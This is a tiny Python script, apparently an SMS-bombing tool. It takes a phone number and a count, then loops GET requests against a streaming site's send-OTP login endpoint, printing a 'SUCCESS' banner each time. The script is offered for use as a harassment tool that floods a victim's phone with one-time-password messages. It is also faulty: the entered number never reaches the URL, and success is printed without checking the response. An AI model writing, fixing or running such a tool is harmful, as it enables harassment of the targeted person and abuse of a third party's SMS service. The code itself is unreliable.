import requests
number = str(input("ENTER YOUR NUMBER :>> "))
amount =int(input("ENTER YOUR AMOUNT :>> "))
url = "http://www.bioscopelive.com/bn/login/send-otp?phone=88+&operator=bd-otp"

for i in range (amount):
	resp = requests.get(url)
	print ("NISHAT-VAI|| SMS || SUCCESS")